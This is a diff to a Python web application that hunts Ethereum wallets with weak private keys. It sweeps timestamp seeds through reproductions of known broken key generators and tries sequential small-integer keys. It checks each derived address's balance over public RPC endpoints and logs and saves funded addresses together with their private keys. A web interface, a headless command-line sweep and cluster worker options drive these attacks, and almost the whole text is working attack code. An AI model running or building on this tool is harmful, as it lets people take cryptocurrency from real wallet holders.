+    return "empty_or_spent"
+
+
+def _eth_flush(candidates, log, job, should_stop=None, prefix=""):
+    """Live-check one batch of ETH candidates; save the funded ones.
+
+    Returns (saved_hits, stopped). A transport failure or 429 stores nothing —
+    a rate limit is not a verdict — and counts the batch as throttled so
+    /results can re-check those addresses later.
+    """
+    if not candidates:
+        return [], False
+    if not ETH_VERIFY_BALANCES:
+        job["eth_unchecked"] = job.get("eth_unchecked", 0) + len(candidates)
+        return [], False
+    addrs = [c["address"] for c in candidates]
+    try:
+        balances = _eth_balances(addrs, should_stop)
+    except RuntimeError as e:
+        if "stopped by user" in str(e):
+            log(prefix + "[eth] stopped by user")
+            return [], True
+        job["throttled"] = job.get("throttled", 0) + len(addrs)
+        log("%s[!] %d candidate(s) left unchecked: %s"
+            % (prefix, len(addrs), e))
+        return [], False
+    saved, skipped = [], 0
+    for c in candidates:
+        v = balances.get(c["address"]) or {"wei": 0, "nonce": 0,
+                                           "error": "no result"}
+        err = v.get("error") or ""
+        now = datetime.now(timezone.utc).isoformat(timespec="seconds")
+        if err:
+            _store_eth_check(c["address"], 0, 0, err)
+            hit = {**c, "balance_wei": None, "balance_nonce": 0,
+                   "balance_checked_at": now, "balance_error": err,
+                   "balance_verdict": "check_failed"}
+            saved.append(hit)
+            _save_result(c.get("attack", "eth"), hit)
+            log("%s[!] %s: balance check failed (%s) — saved as candidate"
+                % (prefix, c["address"], err))
+            continue
+        wei, nonce = v["wei"], v["nonce"]
+        _store_eth_check(c["address"], wei, nonce)
+        verdict = _eth_verdict(wei, nonce)
+        hit = {**c, "balance_wei": str(wei), "balance_eth": wei / 1e18,
+               "balance_nonce": nonce, "balance_checked_at": now,
+               "balance_error": "", "balance_verdict": verdict}
+        if wei >= max(ETH_MIN_WEI, 1):
+            saved.append(hit)
+            _save_result(c.get("attack", "eth"), hit)
+            log("%s  ★★★ ETH HIT %s  %.6f ETH  nonce=%d  privkey=%s  %s"
+                % (prefix, hit["address"], wei / 1e18, nonce,
+                   hit.get("privkey", ""), hit.get("recipe", "")))
+        else:
+            skipped += 1
+    if skipped:
+        job["eth_skipped"] = job.get("eth_skipped", 0) + skipped
+    return saved, False
+
+
+def _eth_candidate(rid, priv, extra, attack, ts=None, unit=None):
+    """Build the hit payload for one derived candidate (address encoded once)."""
+    addr = eth_address(priv)
+    if addr is None:
+        return None
+    hit = {"chain": "ethereum", "address": addr, "privkey": hex(priv % N),
+           "recipe": rid, "recipe_label": ETH_RECIPES[rid]["label"],
+           "attack": attack,
+           "found_at": datetime.now(timezone.utc).isoformat(timespec="seconds")}
+    if ts is not None:
+        hit["ts"] = ts
+    if unit:
+        hit["unit"] = unit
+    hit.update(extra)
+    return hit
+
+
+def attack_eth_timestamp(start, end, unit, recipe_ids, log, job):
+    """Sweep a timestamp range through the selected weak-generator recipes."""
+    ids = [r for r in (recipe_ids or [])
+           if r in ETH_RECIPES and unit in ETH_RECIPES[r]["units"]]
+    if not ids:
+        log("[eth] no usable recipe for unit=%s — nothing to do" % unit)
+        job["detail"] = "no recipes for this unit"
+        return []
+    total = int(end) - int(start) + 1
+    if total <= 0:
+        return []
+    chunk_count = -(-total // max(1, ETH_MAX_STEPS))
+    log("[eth] %d..%d %s  (%s timestamps, %s chunk(s) of at most %s steps)  "
+        "recipes: %s  EC: %s  hash: %s"
+        % (start, end, unit, format(total, ","), format(chunk_count, ","),
+           format(ETH_MAX_STEPS, ","), ", ".join(ids), EC_BACKEND,
+           ETH_HASH_BACKEND))
+    if ETH_VERIFY_BALANCES:
+        log("[eth] balances come from %d RPC endpoint(s) in batches of %d "
+            "addresses (%d calls): %s"
+            % (len(_ETH_RPC_BASES), ETH_RPC_BATCH, ETH_RPC_BATCH * 2,
+               _esplora_status(_ETH_RPC_BASES)))
+    else:
+        log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
+            "saved; they are only counted as unchecked")
+    hits = []
+    pending = []
+    seen_batch = set()          # dedupe within a batch only: bounded memory,
+    ts_done = 0                 # so a 2.5M-seed sweep needs no address set
+    t0 = time.time()
+    base_done = 0
+    stopped = False
+    for chunk_no, (cs, ce) in enumerate(
+            _range_chunks(start, end, ETH_MAX_STEPS), 1):
+        if job["stop"]:
+            log("[eth] stopped")
+            break
+        log("[eth] chunk %d/%d: %d..%d (%s timestamps)"
+            % (chunk_no, chunk_count, cs, ce, format(ce - cs + 1, ",")))
+        for i, ts in enumerate(range(cs, ce + 1)):
+            if job["stop"]:
+                log("[eth] stopped")
+                stopped = True
+                break
+            for rid in ids:
+                try:
+                    for priv, extra in ETH_RECIPES[rid]["fn"](ts, unit):
+                        if not priv or priv % N == 0:
+                            continue
+                        hit = _eth_candidate(rid, priv, extra, "eth_" + rid,
+                                             ts, unit)
+                        if hit and hit["address"] not in seen_batch:
+                            seen_batch.add(hit["address"])
+                            pending.append(hit)
+                except Exception as e:
+                    if not job.get("_eth_recipe_err"):
+                        job["_eth_recipe_err"] = True
+                        log("[eth] recipe %s failed: %s" % (rid, e))
+            ts_done += 1
+            if len(pending) >= ETH_RPC_BATCH:
+                batch, pending = pending, []
+                seen_batch.clear()
+                saved, stopped = _eth_flush(batch, log, job,
+                                            lambda: job["stop"])
+                hits += saved
+                if stopped:
+                    break
+            if i % 200 == 0 or i == (ce - cs):
+                elapsed = max(time.time() - t0, 0.001)
+                rate = (base_done + i + 1) / elapsed
+                left = total - (base_done + i + 1)
+                job["progress"] = min(1.0, (base_done + i + 1) / total)
+                job["detail"] = ("%s/%s ts  chunk %d/%d  %.0f ts/s  %d "
+                                 "recipe(s)  hits=%d  unchecked=%s  "
+                                 "throttled=%s  eta ~%.1f min"
+                                 % (format(base_done + i + 1, ","),
+                                    format(total, ","), chunk_no, chunk_count,
+                                    rate, len(ids), len(hits),
+                                    format(job.get("eth_unchecked", 0), ","),
+                                    format(job.get("throttled", 0), ","),
+                                    left / max(rate, 0.001) / 60))
+        base_done += ce - cs + 1
+        if stopped:
+            break
+    if pending and not stopped:
+        saved, stopped = _eth_flush(pending, log, job, lambda: job["stop"])
+        hits += saved
+    log("[eth] done — %d hit(s), %s empty candidate(s) skipped, %s unchecked"
+        % (len(hits), format(job.get("eth_skipped", 0), ","),
+           format(job.get("eth_unchecked", 0) + job.get("throttled", 0), ",")))
+    return hits
+
+
+def attack_eth_weakkeys(count, extra_keys, log, job):
+    """Sequential keys 1..count plus any hex keys pasted in the UI.
+
+    This is the 2015-2016 "ethercombing" vector: keys that are small integers
+    or trivial words, not a timestamp sweep.
+    """
+    count = max(0, int(count or 0))
+    extra = []
+    seen_extra = set()
+    for line in (extra_keys or []):
+        line = (line or "").strip()
+        if not line:
+            continue
+        try:
+            k = int(line, 16) if line.lower().startswith("0x") else int(line, 16)
+        except ValueError:
+            log("[eth] skipping unparsable key: %s" % line[:40])
+            continue
+        k %= N
+        if not k or k in seen_extra:
+            continue
+        seen_extra.add(k)
+        if k <= count:
+            log("[eth] pasted key %s is inside 1..%s — the sequential scan "
+                "covers it" % (hex(k), format(count, ",")))
+            continue
+        extra.append(k)
+    total = count + len(extra)
+    if total <= 0:
+        log("[eth] nothing to scan")
+        job["detail"] = "no keys"
+        return []
+    log("[eth] weak keys: 1..%s plus %d pasted key(s)  EC: %s  hash: %s"
+        % (format(count, ","), len(extra), EC_BACKEND, ETH_HASH_BACKEND))
+    if not ETH_VERIFY_BALANCES:
+        log("[eth] ETH_VERIFY_BALANCES=0 — candidates are NOT checked and NOT "
+            "saved; they are only counted as unchecked")
+    hits = []
+    pending = []
+    seen_batch = set()
+    done = 0
+    t0 = time.time()
+    stopped = False
+
+    def key_stream():
+        for k in extra:
+            yield k, "pasted"
+        for i in range(1, count + 1):
+            yield i, "sequential"
+
+    for k, origin in key_stream():
+        if job["stop"]:
+            log("[eth] stopped")
+            stopped = True
+            break
+        try:
+            addr = eth_address(k)
+        except Exception:
+            addr = None
+        if addr and addr not in seen_batch:
+            seen_batch.add(addr)
+            pending.append({"chain": "ethereum", "address": addr,
+                            "privkey": hex(k), "recipe": "weakkey",
+                            "recipe_label": origin + " weak key",
+                            "attack": "eth_weakkey",
+                            "found_at": datetime.now(
+                                timezone.utc).isoformat(timespec="seconds")})
+        done += 1
+        if len(pending) >= ETH_RPC_BATCH:
+            batch, pending = pending, []
+            seen_batch.clear()
+            saved, stopped = _eth_flush(batch, log, job, lambda: job["stop"])
+            hits += saved
+            if stopped:
+                break
+        if done % 500 == 0:
+            rate = done / max(time.time() - t0, 0.001)
+            job["progress"] = min(1.0, done / total)
+            job["detail"] = ("%s/%s keys  %.0f key/s  hits=%d  unchecked=%s  "
+                             "throttled=%s  eta ~%.1f min"
+                             % (format(done, ","), format(total, ","), rate,
+                                len(hits),
+                                format(job.get("eth_unchecked", 0), ","),
+                                format(job.get("throttled", 0), ","),
+                                (total - done) / max(rate, 0.001) / 60))
+    if pending and not stopped:
+        saved, stopped = _eth_flush(pending, log, job, lambda: job["stop"])
+        hits += saved
+    job["progress"] = min(1.0, done / total) if total else 1.0
+    log("[eth] done — %d hit(s) from %s key(s), %s empty skipped"
+        % (len(hits), format(done, ","),
+           format(job.get("eth_skipped", 0), ",")))
+    return hits
+
+
+def _all_eth_addresses(limit=None):
+    """Unique checksummed 0x addresses from every saved hit."""
+    with _db() as c:
+        rows = list(c.execute("SELECT payload FROM results ORDER BY id DESC"))
+    out, seen = [], set()
+    for (p,) in rows:
+        try:
+            item = json.loads(p)
+        except Exception:
+            continue
+        if not isinstance(item, dict):
+            continue
+        for key in ("address", "recovered_addr"):
+            a = item.get(key)
+            if not isinstance(a, str) or not _ETH_ADDR_RE.match(a.strip()):
+                continue
+            a = a.strip()
+            if a.lower() in seen:
+                continue
+            seen.add(a.lower())
+            out.append(a)
+            if limit and len(out) >= limit:
+                return out
+    return out
+
+
+def verify_eth_balances(force, log, job):
+    """Re-check saved ETH hits over RPC, in batches, with retry passes.
+
+    Mirrors the Bitcoin verify job: a 429 re-queues the batch instead of
+    recording an error, because a rate limit says nothing about the address.
+    """
+    addrs = _all_eth_addresses(VERIFY_MAX_ADDRESSES)
+    if not addrs:
+        log("[eth-verify] no saved Ethereum hits with a valid 0x address")
+        job["detail"] = "no addresses to check"
+        return
+    total = len(addrs)
+    log("[eth-verify] checking %s address(es) in batches of %d against %s"
+        % (format(total, ","), ETH_RPC_BATCH,
+           _esplora_status(_ETH_RPC_BASES)))
+    t0 = time.time()
+    funded = never_used = emptied = errors = checked = 0
+    pending = list(addrs)
+    passes = 0
+    stopped = False
+    while pending and passes <= VERIFY_RETRY_PASSES and not stopped:
+        passes += 1
+        batch_all, pending = pending, []
+        if passes > 1:
+            wait = min(ESPLORA_MAX_BACKOFF_SECS, 5.0 * (2 ** (passes - 2)))
+            log("[eth-verify] pass %d/%d: retrying %s throttled address(es) "
+                "in %.0fs — %s"
+                % (passes, VERIFY_RETRY_PASSES + 1, format(len(batch_all), ","),
+                   wait, _esplora_status(_ETH_RPC_BASES)))
+            try:
+                _esplora_sleep(wait, lambda: job["stop"])
+            except RuntimeError:
+                log("[eth-verify] stopped by user")
+                break
+        for off in range(0, len(batch_all), ETH_RPC_BATCH):
+            if job["stop"]:
+                log("[eth-verify] stopped by user")
+                stopped = True
+                break
+            chunk = batch_all[off:off + ETH_RPC_BATCH]
+            try:
+                res = _eth_balances(chunk, lambda: job["stop"])
+            except RuntimeError as e:
+                if "stopped by user" in str(e):
+                    log("[eth-verify] stopped by user")
+                    stopped = True
+                    break
+                pending += chunk                 # throttled: retry later
+                continue
+            for a in chunk:
+                v = res.get(a) or {"wei": 0, "nonce": 0, "error": "no result"}
+                if v["error"]:
+                    errors += 1
+                    checked += 1
+                    _store_eth_check(a, 0, 0, v["error"])
+                    log("[eth-verify] %s: %s" % (a, v["error"]))
+                    continue
+                checked += 1
+                _store_eth_check(a, v["wei"], v["nonce"])
+                if v["wei"] > 0:
+                    funded += 1
+                    log("[eth-verify] %s: %.6f ETH nonce=%d — VERIFY MANUALLY"
+                        % (a, v["wei"] / 1e18, v["nonce"]))
+                elif v["nonce"] == 0:
+                    never_used += 1
+                else:
+                    emptied += 1
+                    log("[eth-verify] %s: 0 ETH, nonce=%d (used and emptied)"
+                        % (a, v["nonce"]))
+            rate = checked / max(time.time() - t0, 0.001)
+            job["progress"] = min(1.0, checked / total)
+            job["throttled"] = len(pending)
+            job["detail"] = ("%s/%s addresses  funded=%d  never-used=%s  "
+                             "emptied=%s  errors=%d  throttled=%s  %.1f addr/s"
+                             % (format(checked, ","), format(total, ","),
+                                funded, format(never_used, ","),
+                                format(emptied, ","), errors,
+                                format(len(pending), ","), rate))
+    job["throttled"] = len(pending)
+    tail = (", %s still throttled after %d pass(es) — run it again"
+            % (format(len(pending), ","), passes) if pending else "")
+    log("[eth-verify] done — %d with a balance, %s never used, %s emptied, "
+        "%d errors%s"
+        % (funded, format(never_used, ","), format(emptied, ","), errors, tail))
+
+
+def _eth_ping_base(base):
+    """eth_blockNumber plus a 2-call batch probe, for the Test RPC button."""
+    t0 = time.monotonic()
+    info = {"url": base, "host": base.split("//")[-1], "ok": False,
+            "block": None, "batch": False, "ms": 0, "error": ""}
+    try:
+        r = requests.post(base, json={"jsonrpc": "2.0", "id": 1,
+                                      "method": "eth_blockNumber",
+                                      "params": []},
+                          timeout=min(12.0, ETH_RPC_TIMEOUT),
+                          headers=_eth_headers())
+        info["ms"] = round((time.monotonic() - t0) * 1000)
+        if r.status_code != 200:
+            info["error"] = "HTTP %d" % r.status_code
+            return info
+        d = r.json()
+        if not (isinstance(d, dict) and d.get("result")):
+            info["error"] = json.dumps(d)[:160]
+            return info
+        info["ok"] = True
+        info["block"] = int(d["result"], 16)
+        t1 = time.monotonic()
+        r2 = requests.post(base, json=[
+            {"jsonrpc": "2.0", "id": "a", "method": "eth_blockNumber",
+             "params": []},
+            {"jsonrpc": "2.0", "id": "b", "method": "eth_getBalance",
+             "params": ["0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf",
+                       "latest"]}],
+            timeout=min(12.0, ETH_RPC_TIMEOUT), headers=_eth_headers())
+        info["batch"] = r2.status_code == 200 and isinstance(r2.json(), list)
+        info["batch_ms"] = round((time.monotonic() - t1) * 1000)
+        if not info["batch"]:
+            _ETH_BATCH_OK[base] = False
+    except Exception as e:
+        info["ms"] = round((time.monotonic() - t0) * 1000)
+        info["error"] = str(e)[:200]
+    return info
+
+
+@app.route("/eth")
+def eth_page():
+    rec = []
+    for rid, r in ETH_RECIPES.items():
+        rec.append(
+            "<label class='rec' data-units='%s'><input type='checkbox' "
+            "name='eth_recipe' value='%s'%s> <b>%s</b> "
+            "<span class='muted'>[%s]</span><br><span class='muted'>%s</span>"
+            "</label>" % (
+                html.escape(",".join(r["units"])), html.escape(rid),
+                " checked" if r["default"] else "", html.escape(r["label"]),
+                html.escape("/".join(r["units"])), html.escape(r["note"])))
+    presets = []
+    for p in ETH_PRESETS:
+        presets.append(
+            "<button class='btn' onclick=\"preset('%s','%s',%d,%d)\" "
+            "title='%s'>%s</button>" % (
+                p["id"], p["unit"], p["start"], p["end"],
+                html.escape(p["note"]), html.escape(p["label"])))
+    body = """
+<div class="card"><h2>Ethereum — timestamp sweep</h2>
+<p class="muted">Ethereum uses the same curve as Bitcoin (secp256k1), so a weak
+key generator is swept the same way — but there is <b>no bloom filter</b> here:
+every derived address is checked live over JSON-RPC, batched
+{batch} addresses ({calls} calls) per request. A timestamp is a <b>seed for a
+broken generator, never a private key</b>: pick the recipe that reproduces the
+generator you are sweeping. Unit matters — the Trust Wallet bug was seeded in
+<b>seconds</b>, BitcoinJS-lib in <b>milliseconds</b>.</p>
+<label>Unit</label>
+<select id="unit" onchange="unitChanged()">
+<option value="s">seconds</option>
+<option value="ms">milliseconds</option>
+</select>
+<label>Start</label><input id="s" value="1669248000">
+<label>End</label><input id="e" value="1671753599">
+<p>{presets}</p>
+<p class="muted">One run may span at most {maxtotal} steps
+({maxsteps} per chunk, split automatically). Recipes:</p>
+<div class="recipes">{recipes}</div>
+<button class="btn" onclick="startTs()">Start</button>
+<button class="btn danger" onclick="stop('eth_ts')">Stop</button>
+<div class="bar"><div id="barTs" style="width:0%"></div></div>
+<p id="detailTs" class="muted"></p><pre id="logTs"></pre>
+</div>
+<div class="card"><h2>Ethereum — weak &amp; sequential keys</h2>
+<p class="muted">The 2015–2016 "ethercombing" vector: private keys that are
+small integers (1, 2, 3, …) or trivial values, drained en masse by an automated
+scanner. No timestamp is involved. Sequential keys cost one derivation each
+(~2,300/s with native Keccak), so 100,000 keys is about a minute of work plus
+RPC time.</p>
+<label>Sequential keys to try (1..N)</label><input id="n" value="10000">
+<label>Extra private keys (one hex per line, optional)</label>
+<textarea id="keys" rows="4" placeholder="0x1&#10;deadbeef…"></textarea>
+<button class="btn" onclick="startWk()">Start</button>
+<button class="btn danger" onclick="stop('eth_weak')">Stop</button>
+<div class="bar"><div id="barWk" style="width:0%"></div></div>
+<p id="detailWk" class="muted"></p><pre id="logWk"></pre>
+</div>
+<div class="card"><h2>RPC endpoints</h2>
+<p class="muted">Balances come from {bases}. Public endpoints rate-limit; a 429
+parks that endpoint and fails over to the next one, and throttled batches are
+retried rather than recorded as errors. Set <code>ETH_RPC_URLS</code> to use
+your own node — that is the only way to sweep millions of candidates quickly.
+Test them before a long run:</p>
+<button class="btn" onclick="pingRpc()">Test RPC</button>
+<pre id="rpc">not tested</pre>
+<p class="muted">EC backend: {ec} · Keccak: {hashb} · min balance to save:
+{minwei} wei · verify on: <a href="/results">/results</a> (Check ETH
+balances)</p>
+</div>
+<script>
+function preset(id,unit,s,e){
+  document.getElementById('unit').value=unit;
+  document.getElementById('s').value=s;
+  document.getElementById('e').value=e;
+  unitChanged();
+}
+function unitChanged(){
+  const u=document.getElementById('unit').value;
+  document.querySelectorAll('label.rec').forEach(function(l){
+    const units=(l.getAttribute('data-units')||'').split(',');
+    const box=l.querySelector('input');
+    if(units.indexOf(u)<0){ box.checked=false; box.disabled=true; l.style.opacity=0.4; }
+    else { box.disabled=false; l.style.opacity=1; }
+  });
+}
+function recipes(){
+  return Array.prototype.slice.call(
+    document.querySelectorAll('input[name=eth_recipe]:checked'))
+    .map(function(b){return b.value;});
+}
+function startTs(){
+  const r=recipes();
+  if(!r.length){ notify('pick at least one recipe',false); return; }
+  post('/api/eth/timestamp',{start:document.getElementById('s').value,
+    end:document.getElementById('e').value,
+    unit:document.getElementById('unit').value, recipes:r});
+}
+function startWk(){
+  post('/api/eth/weakkeys',{count:document.getElementById('n').value,
+    keys:document.getElementById('keys').value});
+}
+function pingRpc(){
+  document.getElementById('rpc').textContent='testing…';
+  post('/api/eth/ping',{}).then(function(d){
+    const el=document.getElementById('rpc');
+    if(!el) return;
+    el.textContent=(d.bases||[]).map(function(b){
+      return (b.ok?'ok  ':'FAIL')+' '+b.host+'  block='+b.block+
+             '  batch='+(b.batch?'yes':'no')+'  '+b.ms+'ms'+
+             (b.error?'  '+b.error:'');
+    }).join(String.fromCharCode(10)) || 'no endpoints configured';
+  });
+}
+unitChanged();
+watch('eth_ts','Ts');
+watch('eth_weak','Wk');
+</script>"""
+    body = (body
+            .replace("{recipes}", "".join(rec))
+            .replace("{presets}", "".join(presets))
+            .replace("{batch}", "{:,}".format(ETH_RPC_BATCH))
+            .replace("{calls}", "{:,}".format(ETH_RPC_BATCH * 2))
+            .replace("{maxtotal}", "{:,}".format(ETH_MAX_TOTAL_STEPS))
+            .replace("{maxsteps}", "{:,}".format(ETH_MAX_STEPS))
+            .replace("{bases}", html.escape(", ".join(
+                x.split("//")[-1] for x in _ETH_RPC_BASES)))
+            .replace("{ec}", html.escape(EC_BACKEND))
+            .replace("{hashb}", html.escape(ETH_HASH_BACKEND))
+            .replace("{minwei}", "{:,}".format(ETH_MIN_WEI)))
+    return page(body)
+
+
+@app.route("/api/eth/recipes")
+def api_eth_recipes():
+    return {"recipes": [{"id": rid, "label": r["label"], "units": list(r["units"]),
+                         "note": r["note"], "default": r["default"]}
+                        for rid, r in ETH_RECIPES.items()],
+            "presets": ETH_PRESETS,
+            "rpc_bases": [{"url": u, "host": _esplora_host(u)}
+                          for u in _ETH_RPC_BASES],
+            "rpc_status": _esplora_status(_ETH_RPC_BASES),
+            "batch_addresses": ETH_RPC_BATCH,
+            "min_wei": ETH_MIN_WEI,
+            "verify_balances": ETH_VERIFY_BALANCES,
+            "max_steps": ETH_MAX_STEPS,
+            "max_total_steps": ETH_MAX_TOTAL_STEPS,
+            "max_weak_keys": ETH_MAX_WEAK_KEYS,
+            "ec_backend": EC_BACKEND,
+            "hash_backend": ETH_HASH_BACKEND,
+            "wordlist": str(BIP39_WORDLIST_PATH)}
+
+
+@app.route("/api/eth/timestamp", methods=["POST"])
+def api_eth_timestamp():
+    j = request.get_json(silent=True) or {}
+    unit = str(j.get("unit") or "s").strip().lower()
+    if unit not in ("ms", "s"):
+        return {"ok": False, "msg": "unit must be 'ms' or 's'"}
+    try:
+        start, end = int(j["start"]), int(j["end"])
+    except (KeyError, TypeError, ValueError):
+        return {"ok": False, "msg": "start and end must be integer timestamps"}
+    if end < start:
+        return {"ok": False, "msg": "end must be >= start"}
+    span = end - start + 1
+    if span > ETH_MAX_TOTAL_STEPS:
+        return {"ok": False,
+                "msg": ("range too large: %s steps is over the %s cap; set "
+                        "ETH_MAX_TOTAL_STEPS to raise it, or sweep a slice"
+                        % (format(span, ","), format(ETH_MAX_TOTAL_STEPS, ",")))}
+    ids = j.get("recipes") or []
+    if not isinstance(ids, list):
+        ids = [str(ids)]
+    ids = [str(x) for x in ids]
+    usable = [r for r in ids if r in ETH_RECIPES and unit in ETH_RECIPES[r]["units"]]
+    if not usable:
+        return {"ok": False,
+                "msg": ("no selected recipe accepts unit=%s — pick one of: %s"
+                        % (unit, ", ".join(
+                            r for r in ETH_RECIPES
+                            if unit in ETH_RECIPES[r]["units"])))}
+    ok, msg = _start_job("eth_ts", attack_eth_timestamp, start, end, unit, usable)
+    return {"ok": ok, "msg": msg, "recipes": usable}
+
+
+@app.route("/api/eth/weakkeys", methods=["POST"])
+def api_eth_weakkeys():
+    j = request.get_json(silent=True) or {}
+    try:
+        count = int(str(j.get("count") or 0).replace(",", "").strip() or 0)
+    except ValueError:
+        return {"ok": False, "msg": "count must be an integer"}
+    raw = j.get("keys") or ""
+    if isinstance(raw, list):
+        lines = [str(x) for x in raw]
+    else:
+        lines = str(raw).splitlines()
+    lines = [x.strip() for x in lines if x and x.strip()]
+    if count < 0:
+        return {"ok": False, "msg": "count must be >= 0"}
+    if count + len(lines) > ETH_MAX_WEAK_KEYS:
+        return {"ok": False,
+                "msg": ("too many keys: %s is over ETH_MAX_WEAK_KEYS=%s"
+                        % (format(count + len(lines), ","),
+                           format(ETH_MAX_WEAK_KEYS, ",")))}
+    if count + len(lines) == 0:
+        return {"ok": False, "msg": "set a count or paste some keys"}
+    ok, msg = _start_job("eth_weak", attack_eth_weakkeys, count, lines)
+    return {"ok": ok, "msg": msg}
+
+
+@app.route("/api/eth/ping", methods=["POST", "GET"])
+def api_eth_ping():
+    """Probe every configured RPC base (parallel, ~1 s each)."""
+    with ThreadPoolExecutor(max_workers=min(4, max(1, len(_ETH_RPC_BASES)))) as ex:
+        bases = list(ex.map(_eth_ping_base, _ETH_RPC_BASES))
+    ok = sum(1 for x in bases if x["ok"])
+    return {"ok": ok > 0, "msg": "%d/%d endpoint(s) answered" % (ok, len(bases)),
+            "bases": bases, "batch_addresses": ETH_RPC_BATCH}
+
+
+@app.route("/api/eth/verify", methods=["POST"])
+def api_eth_verify():
+    """Re-check saved ETH hits over RPC (batched, stoppable, retried)."""
+    ok, msg = _start_job("eth_verify", verify_eth_balances, False)
+    return {"ok": ok, "msg": msg}
+
 if __name__ == "__main__":
     ap = argparse.ArgumentParser(
         epilog="worker mode (for cluster nodes): "
@@ -2930,6 +4145,13 @@ if __name__ == "__main__":
     ap.add_argument("--port", type=int, default=PORT)
     ap.add_argument("--build-bloom", action="store_true")
     ap.add_argument("--cli-randstorm", nargs=2, type=int, metavar=("START","END"))
+    ap.add_argument("--cli-eth", nargs=2, type=int, metavar=("START","END"),
+                    help="headless Ethereum timestamp sweep (no bloom needed)")
+    ap.add_argument("--unit", choices=["s", "ms"], default="s",
+                    help="timestamp unit for --cli-eth")
+    ap.add_argument("--recipes", default="sha256_dec",
+                    help="comma-separated ETH recipes for --cli-eth, e.g. "
+                         "tw_bip39_s,sha256_dec")
     ap.add_argument("--worker", choices=["randstorm", "brainwallet"],
                     help="run a single shard of an attack and exit (cluster worker mode)")
     ap.add_argument("--shard", metavar="IDX/N", help="0-based shard index / total shards, e.g. 3/10")
@@ -2945,6 +4167,17 @@ if __name__ == "__main__":
         bf = BloomFilter.load(BLOOM_PATH)
         attack_randstorm(args.cli_randstorm[0], args.cli_randstorm[1],
                          bf, print, {"stop": False, "progress": 0, "detail": ""})
+        sys.exit(0)
+
+    if args.cli_eth:
+        job = {"stop": False, "progress": 0, "detail": ""}
+        ids = [r.strip() for r in args.recipes.split(",") if r.strip()]
+        bad = [r for r in ids if r not in ETH_RECIPES]
+        if bad:
+            sys.exit("unknown recipe(s): %s — available: %s"
+                     % (", ".join(bad), ", ".join(ETH_RECIPES)))
+        attack_eth_timestamp(args.cli_eth[0], args.cli_eth[1], args.unit,
+                             ids, print, job)
         sys.exit(0)
 
     if args.worker:
